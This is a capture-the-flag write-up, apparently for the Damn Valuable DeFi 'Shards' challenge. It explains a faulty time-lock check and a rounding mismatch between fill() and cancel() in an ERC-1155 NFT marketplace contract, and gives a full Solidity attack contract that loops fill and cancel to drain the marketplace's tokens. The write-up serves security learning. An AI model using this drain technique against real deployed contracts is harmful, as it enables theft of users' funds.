# 16. Shards

This was a classic `rounding` attack along with some logical errors inside the contract that allowed the attack to be executed. The contract that we needed to exploit here was ERC-1155 NFT marketplace. This was not relevant to the challenge but it was something new for me to learn.

## The exploit:

- There was an incorrect check which was intended to time-lock the `close` function of the contract. Because of it we were able to execute the `close` function immediately

```solidity
if ( purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
      || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL)
   revert BadTime();
```

- From there we were able to the drain the contract of it’s funds with the following functions: `fill()` uses `mulDivDown` (pay 0 for small amounts) vs `cancel()` uses `mulDivUp` (get refund > 0)

## Resources:

https://rareskills.io/post/erc-1155

## Solution:

```solidity
contract AttackShardsNFTMarketplace {
    uint64 public constant OFFER_ID = 1;
    DamnValuableToken public immutable token;
    ShardsNFTMarketplace public immutable marketplace;
    address public immutable recovery;

    constructor(address marketplaceAddress, address tokenAddress, address recoveryAddress) {
        token = DamnValuableToken(tokenAddress);
        marketplace = ShardsNFTMarketplace(marketplaceAddress);
        recovery = recoveryAddress;
    }

    function attack() external {
        uint64 purchaseIndex = 0;
        uint256 initialMarketplaceBalance = token.balanceOf(address(marketplace));
        uint256 missingTokens = 0;
        while (missingTokens < initialMarketplaceBalance * 1e16 / 100e18) {
            marketplace.fill(OFFER_ID, 133);
            marketplace.cancel(OFFER_ID, purchaseIndex);
            purchaseIndex++;
            missingTokens = initialMarketplaceBalance - token.balanceOf(address(marketplace));
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```
